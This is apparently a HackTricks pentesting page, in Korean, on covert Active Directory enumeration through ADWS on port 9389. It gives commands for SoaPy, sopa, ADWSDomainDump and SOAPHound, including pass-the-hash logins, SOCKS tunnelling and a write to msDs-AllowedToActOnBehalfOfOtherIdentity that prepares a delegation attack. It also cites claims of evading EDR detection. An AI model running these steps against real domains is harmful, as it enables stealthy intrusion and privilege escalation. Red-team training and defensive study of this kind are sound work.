# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## ADWS란?

Active Directory Web Services (ADWS)는 **Windows Server 2008 R2 이후 모든 Domain Controller에서 기본적으로 활성화**되어 있으며 TCP **9389**에서 수신 대기합니다. 이름과 달리 **HTTP는 사용되지 않습니다**. 대신 이 service는 독점적인 .NET framing protocol stack을 통해 LDAP 스타일의 data를 노출합니다:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

traffic이 이러한 binary SOAP frame 내부에 캡슐화되고 일반적이지 않은 port를 통해 이동하기 때문에, **ADWS를 통한 enumeration은 classic LDAP/389 및 636 traffic보다 inspection, filtering 또는 signature detection의 대상이 될 가능성이 훨씬 낮습니다**. operator에게 이는 다음을 의미합니다:<sup>[[1]](#references)[[7]](#references)</sup>

* 더욱 은밀한 recon – Blue team은 흔히 LDAP query에 집중합니다.
* SOCKS proxy를 통해 9389/TCP를 tunnelling하여 **non-Windows host(Linux, macOS)**에서 collect할 수 있는 자유.
* LDAP를 통해 얻을 수 있는 것과 동일한 data(users, groups, ACLs, schema 등)와 **write** 수행 능력(예: **RBCD**를 위한 `msDs-AllowedToActOnBehalfOfOtherIdentity`).

ADWS interaction은 WS-Enumeration을 통해 구현됩니다. 모든 query는 LDAP filter/attributes를 정의하는 `Enumerate` message로 시작하며 `EnumerationContext` GUID를 반환하고, 이후 하나 이상의 `Pull` message가 server에서 정의한 result window까지 data를 stream합니다.<sup>[[7]](#references)</sup> Context는 약 30분 후 만료되므로, state 손실을 방지하려면 tooling에서 result를 page 단위로 가져오거나 filter를 분할해야 합니다(CN별 prefix query 사용).<sup>[[8]](#references)</sup> security descriptor를 요청할 때는 SACL을 생략하기 위해 `LDAP_SERVER_SD_FLAGS_OID` control을 지정해야 합니다. 그렇지 않으면 ADWS는 SOAP response에서 `nTSecurityDescriptor` attribute를 단순히 제거합니다.

> 참고: ADWS는 많은 RSAT GUI/PowerShell tool에서도 사용되므로 traffic이 정상적인 admin activity에 섞일 수 있습니다.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy)는 **순수 Python으로 ADWS protocol stack을 완전히 재구현한 것**입니다. NBFX/NBFSE/NNS/NMF frame을 byte 단위로 구성하므로 .NET runtime을 사용하지 않고도 Unix 계열 system에서 collect할 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>

### 주요 기능

* **SOCKS를 통한 proxying** 지원(C2 implant에서 유용).
* LDAP `-q '(objectClass=user)'`와 동일한 세밀한 search filter.
* 선택적 **write** operation(`--set` / `--delete`).
* BloodHound에 직접 ingest할 수 있는 **BOFHound output mode**.
* 사람이 읽어야 할 때 timestamp / `userAccountControl`을 보기 좋게 변환하는 `--parse` flag.<sup>[[2]](#references)</sup>

### Targeted collection flags & write operations

SoaPy에는 ADWS를 통해 가장 일반적인 LDAP hunting task를 재현하는 엄선된 switch가 포함되어 있습니다: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds` 및 custom pull을 위한 raw `--query` / `--filter` option. 이를 `--rbcd <source>`(`msDs-AllowedToActOnBehalfOfOtherIdentity` 설정), `--spn <service/cn>`(targeted Kerberoasting을 위한 SPN staging), `--asrep`(`userAccountControl`에서 `DONT_REQ_PREAUTH` 전환)과 같은 write primitive와 함께 사용할 수 있습니다.<sup>[[2]](#references)</sup>

`samAccountName` 및 `servicePrincipalName`만 반환하는 targeted SPN hunt 예시:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
동일한 host/credentials를 사용해 findings를 즉시 weaponise하세요. `--rbcds`로 RBCD-capable objects를 dump한 다음, `--rbcd 'WEBSRV01$' --account 'FILE01$'`를 적용해 Resource-Based Constrained Delegation chain을 준비합니다(전체 abuse path는 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)을 참조하세요).

### Installation (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* LDAP 쿼리를 TCP/9389의 ADWS 호출로 대체하여 LDAP-signature 탐지를 줄인 `ldapdomaindump`의 포크입니다.
* `--force`가 전달되지 않으면 9389에 대한 초기 reachability check를 수행합니다(포트 스캔이 noisy/filtered 상태인 경우 probe를 건너뜁니다).
* README에서 Microsoft Defender for Endpoint 및 CrowdStrike Falcon을 대상으로 성공적인 bypass가 확인되었습니다.<sup>[[4]](#references)</sup>

### Installation
```bash
pipx install .
```
### 사용법
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
일반적인 출력에는 9389 연결 가능성 확인, ADWS bind, 덤프 시작/완료가 기록됩니다:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Golang을 위한 실용적인 ADWS client

soapy와 마찬가지로 [sopa](https://github.com/Macmod/sopa)는 Golang으로 ADWS protocol stack (MS-NNS + MC-NMF + SOAP)을 구현하며, 다음과 같은 ADWS call을 실행할 수 있는 command-line flag를 제공합니다:<sup>[[5]](#references)</sup>

* **Object search & retrieval** - `query` / `get`
* **Object lifecycle** - `create [user|computer|group|ou|container|custom]` 및 `delete`
* **Attribute editing** - `attr [add|replace|delete]`
* **Account management** - `set-password` / `change-password`
* 그리고 `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` 등

### Protocol mapping highlights

* LDAP-style search는 attribute projection, scope control (Base/OneLevel/Subtree) 및 pagination을 사용하여 **WS-Enumeration** (`Enumerate` + `Pull`)을 통해 실행됩니다.
* Single-object fetch에는 **WS-Transfer** `Get`이 사용되며, attribute 변경에는 `Put`, 삭제에는 `Delete`가 사용됩니다.
* Built-in object 생성에는 **WS-Transfer ResourceFactory**가 사용되며, custom object에는 YAML template으로 구동되는 **IMDA AddRequest**가 사용됩니다.
* Password operation은 **MS-ADCAP** action (`SetPassword`, `ChangePassword`)입니다.<sup>[[5]](#references)</sup>

### Unauthenticated metadata discovery (mex)

ADWS는 credentials 없이 WS-MetadataExchange를 노출하므로, authentication 전에 exposure를 빠르게 확인할 수 있습니다:<sup>[[5]](#references)</sup>
```bash
sopa mex --dc <DC>
```
### DNS/DC discovery 및 Kerberos targeting notes

`--dc`가 생략되고 `--domain`이 제공되면 Sopa는 SRV를 통해 DC를 resolve할 수 있습니다. 다음 순서로 query하고 우선순위가 가장 높은 target을 사용합니다:<sup>[[5]](#references)</sup>
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
운영 환경에서는 네트워크가 분할된 환경에서의 실패를 방지하기 위해 DC가 제어하는 resolver를 우선 사용하세요:

* `--dns <DC-IP>`를 사용하면 **모든** SRV/PTR/forward lookup이 DC DNS를 통해 수행됩니다.
* UDP가 차단되어 있거나 SRV 응답이 큰 경우 `--dns-tcp`를 사용하세요.
* Kerberos가 활성화되어 있고 `--dc`가 IP인 경우, sopa는 올바른 SPN/KDC targeting을 위해 FQDN을 얻는 **reverse PTR**을 수행합니다. Kerberos를 사용하지 않으면 PTR lookup이 수행되지 않습니다.

Example (IP + Kerberos, DC를 통한 강제 DNS):
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### 인증 자료 옵션

평문 비밀번호 외에도 sopa는 ADWS 인증에 **NT hashes**, **Kerberos AES keys**, **ccache**, **PKINIT certificates** (PFX 또는 PEM)를 지원합니다. `--aes-key`, `-c` (ccache) 또는 certificate-based options를 사용하면 Kerberos가 자동으로 사용됩니다.<sup>[[5]](#references)</sup>
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### 템플릿을 통한 custom object 생성

임의의 object class의 경우 `create custom` command는 IMDA `AddRequest`에 매핑되는 YAML template을 사용합니다:<sup>[[5]](#references)</sup>

* `parentDN`과 `rdn`은 container와 relative DN을 정의합니다.
* `attributes[].name`은 `cn` 또는 namespaced `addata:cn`을 지원합니다.
* `attributes[].type`은 `string|int|bool|base64|hex` 또는 명시적인 `xsd:*`를 허용합니다.
* `ad:relativeDistinguishedName` 또는 `ad:container-hierarchy-parent`를 포함하지 마세요. sopa가 이를 자동으로 삽입합니다.
* `hex` 값은 `xsd:base64Binary`로 변환됩니다. 빈 문자열을 설정하려면 `value: ""`을 사용합니다.

## SOAPHound – 대규모 ADWS Collection (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound)는 모든 LDAP 상호작용을 ADWS 내부에서 처리하고 BloodHound v4 호환 JSON을 생성하는 .NET collector입니다. 한 번 `objectSid`, `objectGUID`, `distinguishedName`, `objectClass`의 전체 cache를 구축한 후(`--buildcache`), 이를 재사용하여 대규모 `--bhdump`, `--certdump`(ADCS) 또는 `--dnsdump`(AD-integrated DNS) pass를 수행하므로 약 35개의 critical attribute만 DC 외부로 전송됩니다. AutoSplit(`--autosplit --threshold <N>`)은 대규모 forest에서 30분 EnumerationContext timeout을 피할 수 있도록 CN prefix에 따라 query를 자동으로 shard합니다.<sup>[[8]](#references)</sup>

domain-joined operator VM에서의 일반적인 workflow:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Export된 JSON 슬롯을 SharpHound/BloodHound workflow에 직접 연결할 수 있습니다. 이후 그래프 분석 아이디어는 [BloodHound methodology](bloodhound.md)를 참고하세요. AutoSplit은 ADExplorer 스타일의 snapshot보다 query 수를 낮게 유지하면서도, 수백만 개 object가 있는 forest에서 SOAPHound의 안정성을 높입니다.

## Stealth AD Collection Workflow

다음 workflow는 Linux에서 ADWS를 통해 **domain & ADCS objects**를 열거하고, 이를 BloodHound JSON으로 변환한 후 certificate 기반 attack path를 탐색하는 과정을 보여줍니다.

1. **대상 network에서 사용자의 box로 9389/TCP를 tunnel합니다** (예: Chisel, Meterpreter, SSH dynamic port-forward 등). `export HTTPS_PROXY=socks5://127.0.0.1:1080`을 실행하거나 SoaPy의 `--proxyHost/--proxyPort`를 사용합니다.

2. **root domain object를 수집합니다:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Configuration NC에서 ADCS 관련 객체 수집:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHound로 변환:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **ZIP을 업로드**한 후 BloodHound GUI에서 `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`와 같은 cypher 쿼리를 실행하여 인증서 권한 상승 경로(ESC1, ESC8 등)를 확인합니다.

### `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD) 쓰기
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
`s4u2proxy`/`Rubeus /getticket`와 결합하여 완전한 **Resource-Based Constrained Delegation** chain을 구성하세요([Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) 참조).

## 도구 요약

| 용도 | 도구 | 비고 |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| 대규모 ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearch logs 변환 |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | 동일한 SOCKS를 통해 proxy 가능 |
| ADWS enumeration 및 object changes | [sopa](https://github.com/Macmod/sopa) | 알려진 ADWS endpoints와 interface하기 위한 generic client - enumeration, object creation, attribute modifications 및 password changes 지원 |

## 참고 자료

- [1] [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
